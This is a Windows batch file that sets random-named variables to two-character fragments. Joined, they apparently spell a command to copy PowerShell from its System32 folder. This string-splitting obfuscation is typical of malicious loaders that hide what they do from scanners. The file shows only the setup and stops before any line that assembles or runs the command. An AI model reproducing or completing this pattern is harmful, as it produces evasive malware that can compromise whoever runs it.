@echo off
set "AzyHXNtmNx=co"
set "fTfDqgwdAf=rS"
set "QYHuHddMuf=em"
set "XxLubiRTgq=s\"
set "PKCsrgxUbq=we"
set "NvwKdPYzjo=\W"
set "nwxvSEOynd=32"
set "dFCfDuLzNc=0\"
set "QQqLjiQpZe=y "
set "XHVbNlzZPd=\v"
set "MKiFQnmLbP=ll"
set "VzwxAdPeWV=in"
set "AZlMjFTNIt=he"
set "WxJYQdGhpL= /"
set "ZqEpPEcoHF=Wi"
set "GCaINIJRHb=py"
set "fECfkNaaVP=Po"
set "BRMePhdSrW=he"
set "YOdsWvBXrS=ws"
set "zviVVeLgjA= C"
set "cmhZBaCozM=ll"
set "pOhQLseQxs=rs"
set "LGYCJNKeuF=do"
set "jhzmkMnrwJ=st"
set "PfnXcJSqeZ=xe"
